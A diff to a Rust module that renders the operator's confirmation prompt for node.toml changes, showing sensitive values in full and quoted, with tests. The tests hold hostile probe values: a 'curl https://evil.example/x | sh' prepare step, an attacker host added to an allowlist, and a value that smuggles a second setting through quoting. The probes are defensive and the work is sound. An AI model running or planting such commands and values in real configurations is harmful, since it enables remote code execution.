@@ -2,12 +2,15 @@
 //!
 //! The prompt is the last thing between a phished confirmation and a write,
 //! so it is built to be read by someone who did not make the request: what
-//! could change what the node runs, trusts, reads or sends comes first,
-//! with its new value, and is never cut short. A change too large to show
-//! that way is refused, to be split. Routine keys follow, as many as fit,
-//! and how many more. An entry of an array of tables is named by its own
-//! `path`, `name` or `id`, never by an index alone, and its changed fields
-//! are listed.
+//! could change what the node runs, trusts, reads, sends or reaches comes
+//! first, with its value in full, quoted, and never cut short: a list shows
+//! the elements it gains and loses, a single value what it was and what it
+//! becomes. A change too large to show that way is refused, to be split.
+//! Routine keys follow, as many as fit, and how many more. An entry of an
+//! array of tables is named by its own `path`, `name` or `id` as it was
+//! before the edit, never by an index alone, and its changed fields are
+//! listed; an entry under a key the node does not read is named by its
+//! index only, since its fields are not shown.
 
 use crate::config::edit::{Change, Seg};
 use crate::config_schema::{self, KEYS};
@@ -20,8 +23,6 @@ const HEAD: &str = "Change node.toml: ";
 const MAX_WILD: usize = 24;
 /// The longest any other key segment is shown.
 const MAX_SEGMENT: usize = 48;
-/// The longest a value is shown.
-const MAX_VALUE: usize = 72;
 
 /// Keys whose change could widen what the node runs, trusts, reads, sends
 /// or reaches, beyond what the schema flags itself (programs, host paths,
@@ -54,6 +55,17 @@ const SENSITIVE: &[&str] = &[
     "embed.api_key_file",
     "embed.provider",
     "github.dispatch",
+    "repo.path",
+    "service.name",
+    "ui.opencode_url",
+    "ui.opencode_listen",
+    "docs.preview_url",
+    "docs.preview_listen",
+    "docs.export_channel",
+    "harness",
+    "external.enabled",
+    "session.default_channel",
+    "notify.contact",
 ];
 
 fn pattern_covers(pattern: &str, key: &[&str]) -> bool {
@@ -115,12 +127,15 @@ fn show_key(segs: &[Seg], docs: Option<(&toml::Table, &toml::Table)>) -> String 
         match seg {
             Seg::Index(index) => {
                 out.push_str(&format!("[{index}]"));
-                let entry = docs.and_then(|(before, after)| {
-                    at(after, &segs[..=i])
-                        .or_else(|| at(before, &segs[..=i]))
-                        .and_then(toml::Value::as_table)
-                        .and_then(entry_name)
-                });
+                // As it was, so a change of its identity is shown as one.
+                let entry = docs.filter(|_| config_schema::known(&names[..n])).and_then(
+                    |(before, after)| {
+                        at(before, &segs[..=i])
+                            .or_else(|| at(after, &segs[..=i]))
+                            .and_then(toml::Value::as_table)
+                            .and_then(entry_name)
+                    },
+                );
                 if let Some(name) = entry {
                     out.push_str(&format!(" ({name})"));
                 }
@@ -139,7 +154,7 @@ fn show_key(segs: &[Seg], docs: Option<(&toml::Table, &toml::Table)>) -> String 
                 {
                     out.push_str(&shown);
                 } else {
-                    out.push_str(&format!("\"{shown}\""));
+                    out.push_str(&quote(&shown));
                 }
                 n += 1;
             }
@@ -148,26 +163,62 @@ fn show_key(segs: &[Seg], docs: Option<(&toml::Table, &toml::Table)>) -> String 
     out
 }
 
-fn show_value(at: &[&str], value: &toml::Value) -> String {
-    if config_schema::lookup(at).secret || !config_schema::known(at) {
-        return "(a new value, not shown)".into();
-    }
-    let text = match value {
-        toml::Value::String(s) => s.clone(),
+/// `text` in double quotes, cleaned, with `"` and `\` escaped, so nothing
+/// inside a value can pass for the prompt's own punctuation.
+fn quote(text: &str) -> String {
+    let clean = clean_text(text, usize::MAX);
+    format!("\"{}\"", clean.replace('\\', "\\\\").replace('"', "\\\""))
+}
+
+/// A value in full: a string quoted, a list element by element.
+fn render(value: &toml::Value) -> String {
+    match value {
+        toml::Value::String(s) => quote(s),
         toml::Value::Array(items) => format!(
             "[{}]",
-            items
+            items.iter().map(render).collect::<Vec<_>>().join(", ")
+        ),
+        toml::Value::Table(table) => format!(
+            "{{{}}}",
+            table
                 .iter()
-                .map(|v| match v {
-                    toml::Value::String(s) => s.clone(),
-                    other => other.to_string(),
-                })
+                .map(|(k, v)| format!("{} = {}", quote(k), render(v)))
                 .collect::<Vec<_>>()
                 .join(", ")
         ),
-        other => other.to_string(),
-    };
-    cut(&text, MAX_VALUE)
+        other => clean_text(&other.to_string(), usize::MAX),
+    }
+}
+
+/// A sensitive key's change, shown in full after its key: a list's added
+/// and removed elements, a value's old and new, or that it went. A secret's
+/// value, and a value under a key the node does not read, is not shown.
+fn show_change(at: &[&str], was: Option<&toml::Value>, now: Option<&toml::Value>) -> String {
+    let hidden = config_schema::lookup(at).secret || !config_schema::known(at);
+    match (was, now) {
+        (_, None) => " removed".into(),
+        (_, Some(_)) if hidden => " = (a new value, not shown)".into(),
+        (Some(toml::Value::Array(old)), Some(toml::Value::Array(new)))
+            if !old.iter().chain(new).any(toml::Value::is_table) =>
+        {
+            let mut parts: Vec<String> = new
+                .iter()
+                .filter(|v| !old.contains(v))
+                .map(|v| format!("+ {}", render(v)))
+                .collect();
+            parts.extend(
+                old.iter()
+                    .filter(|v| !new.contains(v))
+                    .map(|v| format!("- {}", render(v))),
+            );
+            match parts.is_empty() {
+                true => " reordered".into(),
+                false => format!(": {}", parts.join(", ")),
+            }
+        }
+        (Some(old), Some(new)) => format!(": {} -> {}", render(old), render(new)),
+        (None, Some(new)) => format!(" = {}", render(new)),
+    }
 }
 
 /// What names an entry of an array of tables, for the operator.
@@ -175,7 +226,7 @@ fn entry_name(entry: &toml::Table) -> Option<String> {
     ["path", "name", "id"]
         .iter()
         .find_map(|k| entry.get(*k).and_then(toml::Value::as_str))
-        .map(|name| cut(name, MAX_SEGMENT))
+        .map(quote)
 }
 
 fn tables(value: Option<&toml::Value>) -> Option<Vec<&toml::Table>> {
@@ -206,17 +257,21 @@ struct Item {
     text: String,
 }
 
-/// One field of an entry, as the prompt lists it: with its value when it is
-/// sensitive.
-fn field(array: &[&str], key: &str, value: Option<&toml::Value>) -> (bool, String) {
+/// One field of an entry, as the prompt lists it: with its change in full
+/// when it is sensitive.
+fn field(
+    array: &[&str],
+    key: &str,
+    was: Option<&toml::Value>,
+    now: Option<&toml::Value>,
+) -> (bool, String) {
     let mut full = array.to_vec();
     full.push(key);
     let sensitive = sensitive(&full);
     let shown = cut(key, MAX_SEGMENT);
-    match (sensitive, value) {
-        (true, Some(v)) => (true, format!("{shown} = {}", show_value(&full, v))),
-        (true, None) => (true, format!("{shown} removed")),
-        (false, _) => (false, shown),
+    match sensitive {
+        true => (true, format!("{shown}{}", show_change(&full, was, now))),
+        false => (false, shown),
     }
 }
 
@@ -232,15 +287,19 @@ fn array_items(key: &[Seg], before: &[&toml::Table], after: &[&toml::Table], out
         })
         .collect();
     let shown = show_key(key, None);
+    // Under a key the node does not read, an entry's fields are not shown,
+    // so neither is what it would be named by.
+    let known = config_schema::known(&names);
+    let name_of = |entry: &toml::Table| entry_name(entry).filter(|_| known);
     let mut listed = false;
     for (i, now) in after.iter().enumerate() {
         if before.contains(now) {
             continue;
         }
-        let name = entry_name(now).unwrap_or_else(|| format!("#{i}"));
+        let name = name_of(now).unwrap_or_else(|| format!("#{i}"));
         let was = before
             .iter()
-            .find(|b| entry_name(b).is_some() && entry_name(b) == entry_name(now));
+            .find(|b| name_of(b).is_some() && name_of(b) == name_of(now));
         let mut fields: Vec<(bool, String)> = Vec::new();
         let mut keys: Vec<&String> = now.keys().collect();
         if let Some(was) = was {
@@ -252,12 +311,12 @@ fn array_items(key: &[Seg], before: &[&toml::Table], after: &[&toml::Table], out
                 continue;
             }
             if was.is_none()
-                && entry_name(now).is_some()
+                && name_of(now).is_some()
                 && ["path", "name", "id"].contains(&k.as_str())
             {
                 continue;
             }
-            fields.push(field(&names, k, value));
+            fields.push(field(&names, k, was.and_then(|w| w.get(k)), value));
         }
         // Sensitive fields first, as everywhere.
         fields.sort_by_key(|(s, _)| !*s);
@@ -279,8 +338,8 @@ fn array_items(key: &[Seg], before: &[&toml::Table], after: &[&toml::Table], out
         if after.contains(was) {
             continue;
         }
-        let name = entry_name(was);
-        if name.is_some() && after.iter().any(|a| entry_name(a) == name) {
+        let name = name_of(was);
+        if name.is_some() && after.iter().any(|a| name_of(a) == name) {
             continue;
         }
         out.push(Item {
@@ -324,10 +383,12 @@ pub fn summarize(
         // A key inside an entry: named by its entry.
         let shown = show_key(segs, Some((before, after)));
         let is_sensitive = sensitive(&names);
-        let text = match (is_sensitive, &change.after) {
-            (true, Some(value)) => format!("{shown} = {}", show_value(&names, value)),
-            (true, None) => format!("{shown} removed"),
-            (false, _) => shown,
+        let text = match is_sensitive {
+            true => format!(
+                "{shown}{}",
+                show_change(&names, change.before.as_ref(), change.after.as_ref())
+            ),
+            false => shown,
         };
         items.push(Item {
             sensitive: is_sensitive,
@@ -404,11 +465,8 @@ mod tests {
         for key in [
             "session.budget_tokens",
             "session.permission_timeout_secs",
-            "session.approval_expiry_secs",
-            "session.claim_grace_secs",
             "review.max_diff_lines",
             "review.max_files",
-            "mesh.heartbeat_secs",
         ] {
             ops.push(set(key, 5));
         }
@@ -421,12 +479,81 @@ mod tests {
         ops.push(set("publish.gh", "/opt/evil/gh"));
         let line = prompt("", &ops).unwrap();
         assert!(line.chars().count() <= MAX_SUMMARY, "{line}");
-        assert!(line.starts_with("Change node.toml: "), "{line}");
-        let gh = line.find("publish.gh = /opt/evil/gh").expect(&line);
-        let budget = line.find("session.budget_tokens");
-        assert!(budget.is_none_or(|b| gh < b), "{line}");
-        assert!(line.contains("mesh.heartbeat_secs = 5"), "{line}");
+        assert!(
+            line.starts_with("Change node.toml: publish.gh = \"/opt/evil/gh\"; "),
+            "{line}"
+        );
         assert!(line.ends_with("more"), "{line}");
+    }
+
+    fn strings(items: &[&str]) -> toml::Value {
+        toml::Value::Array(
+            items
+                .iter()
+                .map(|s| toml::Value::String(s.to_string()))
+                .collect(),
+        )
+    }
+
+    /// The probes: a host appended to a long allowlist and a command at the
+    /// end of a long preparation are shown, however long what is around
+    /// them, as the elements the list gains.
+    #[test]
+    fn what_a_list_gains_is_shown_whole_however_long_the_list() {
+        let hosts: Vec<String> = (0..12)
+            .map(|i| format!("^registry-{i:02}\\.a-long-mirror-name\\.example\\.org$"))
+            .collect();
+        let refs: Vec<&str> = hosts.iter().map(String::as_str).collect();
+        let mut more = refs.clone();
+        more.push("evil.example");
+        let file = format!("[gateway]\nallow_hosts = {}\n", strings(&refs));
+        let line = prompt(&file, &[set("gateway.allow_hosts", strings(&more))]).unwrap();
+        assert_eq!(
+            line,
+            "Change node.toml: gateway.allow_hosts: + \"evil.example\""
+        );
+
+        let steps: Vec<String> = (0..6)
+            .map(|i| format!("composer install --no-interaction --prefer-dist step-{i}"))
+            .collect();
+        let refs: Vec<&str> = steps.iter().map(String::as_str).collect();
+        let mut more = refs.clone();
+        more.push("curl https://evil.example/x | sh");
+        let file = format!(
+            "[[repo]]\npath = \"/src/app\"\ndockerfile = \"Dockerfile\"\nprepare = {}\n",
+            strings(&refs)
+        );
+        let line = prompt(&file, &[set("repo[0].prepare", strings(&more))]).unwrap();
+        assert_eq!(
+            line,
+            "Change node.toml: repo[0] (\"/src/app\").prepare: + \"curl https://evil.example/x | sh\""
+        );
+
+        // A single value is never cut either: too long to show, it is refused.
+        let long = format!("/opt/{}/gh", "x".repeat(700));
+        let err = prompt("", &[set("publish.gh", long.as_str())]).unwrap_err();
+        assert!(err.contains("split"), "{err}");
+        let fits = format!("/opt/{}/gh", "x".repeat(300));
+        let line = prompt("", &[set("publish.gh", fits.as_str())]).unwrap();
+        assert!(line.contains(&fits), "{line}");
+    }
+
+    /// Moving an entry to another repository moves what it lends: named by
+    /// what it was, with the old identity and the new.
+    #[test]
+    fn retargeting_an_entry_shows_its_old_identity_and_its_new() {
+        let file = "[[repo]]\npath = \"/src/app\"\ndockerfile = \"Dockerfile\"\nprepare = [\"composer install\"]\nprepare_credentials = [\"NOVA\"]\n";
+        let line = prompt(file, &[set("repo[0].path", "/src/other")]).unwrap();
+        assert_eq!(
+            line,
+            "Change node.toml: repo[0] (\"/src/app\").path: \"/src/app\" -> \"/src/other\""
+        );
+        let file = "[[service]]\nname = \"db\"\nport = 5432\nimage = \"postgres@sha256:0000000000000000000000000000000000000000000000000000000000000000\"\n";
+        let line = prompt(file, &[set("service[0].name", "cache")]).unwrap();
+        assert!(
+            line.contains("service[0] (\"db\").name: \"db\" -> \"cache\""),
+            "{line}"
+        );
     }
 
     #[test]
@@ -440,13 +567,9 @@ mod tests {
             &[Op::append(KeyPath::keys(&["repo"]), entry)],
         )
         .unwrap();
-        assert!(line.contains("repo /src/app added: "), "{line}");
-        assert!(line.contains("prepare_credentials = [NOVA]"), "{line}");
-        assert!(line.contains("prepare = [composer install]"), "{line}");
-        assert!(line.contains("timeout_secs"), "{line}");
-        assert!(
-            !line.contains("/src/old"),
-            "an unchanged entry is not listed: {line}"
+        assert_eq!(
+            line,
+            "Change node.toml: repo \"/src/app\" added: dockerfile = \"Dockerfile\", prepare = [\"composer install\"], prepare_credentials = [\"NOVA\"], timeout_secs"
         );
 
         let line = prompt(
@@ -454,20 +577,37 @@ mod tests {
             &[Op::remove(KeyPath::parse("repo[0]").unwrap())],
         )
         .unwrap();
-        assert_eq!(line, "Change node.toml: repo /src/old removed");
+        assert_eq!(line, "Change node.toml: repo \"/src/old\" removed");
+    }
 
-        // A field of an entry is named by its entry.
+    /// An entry under a key the node does not read is not named by its
+    /// fields: they are hidden, and a name is one of them.
+    #[test]
+    fn an_entry_under_an_unknown_key_echoes_nothing_of_itself() {
+        let file =
+            "[[qa.things]]\nname = \"s3cr3t-token-value\"\n[[qa.things]]\nname = \"other\"\n";
+        let line = prompt(file, &[Op::remove(KeyPath::parse("qa.things[0]").unwrap())]).unwrap();
+        assert!(!line.contains("s3cr3t"), "{line}");
+        let line = prompt(file, &[set("qa.things[0].name", "x")]).unwrap();
+        assert!(!line.contains("s3cr3t"), "{line}");
+        assert!(line.contains("not shown"), "{line}");
+    }
+
+    /// Nothing inside a key or a value can pass for the prompt's own
+    /// punctuation.
+    #[test]
+    fn quotes_and_separators_inside_keys_and_values_are_quoted() {
         let line = prompt(
-            "[[repo]]\npath = \"/src/app\"\n",
+            "",
             &[set(
-                "repo[0].egress",
-                toml::Value::Array(vec!["crates".into()]),
+                "providers.\"a\\\"; publish.gh = x\".upstream",
+                "https://h.example/v1\"; mesh.hub_url = \"https://ok.example",
             )],
         )
         .unwrap();
         assert_eq!(
             line,
-            "Change node.toml: repo[0] (/src/app).egress = [crates]"
+            "Change node.toml: providers.\"a\\\"; publish.gh = x\".upstream = \"https://h.example/v1\\\"; mesh.hub_url = \\\"https://ok.example\""
         );
     }
 
@@ -501,7 +641,7 @@ mod tests {
             line.contains(&format!("providers.\"p{}...\"", "a".repeat(23))),
             "{line}"
         );
-        assert!(line.contains("= https://h.example/v1"), "{line}");
+        assert!(line.contains("= \"https://h.example/v1\""), "{line}");
     }
 
     #[test]
@@ -514,7 +654,20 @@ mod tests {
             &["gateway", "allow_hosts"],
             &["providers", "x", "upstream"],
             &["repo", "prepare_credentials"],
+            &["repo", "path"],
+            &["service", "name"],
             &["embed", "base_url"],
+            &["ui", "opencode_url"],
+            &["ui", "opencode_listen"],
+            &["docs", "preview_url"],
+            &["docs", "preview_listen"],
+            &["docs", "export_channel"],
+            &["harness", "id"],
+            &["harness", "tools"],
+            &["harness", "version"],
+            &["external", "enabled"],
+            &["session", "default_channel"],
+            &["notify", "contact"],
             &["qa", "unknown"],
             &["publish"],
             &["providers", "x"],
@@ -526,6 +679,9 @@ mod tests {
             &["session", "budget_tokens"],
             &["providers", "x", "models"],
             &["repo", "timeout_secs"],
+            &["memory", "promote_at"],
+            &["supervision", "timeout_secs"],
+            &["supervision", "dependency_inputs", "x"],
         ] {
             assert!(!sensitive(key), "{key:?}");
         }
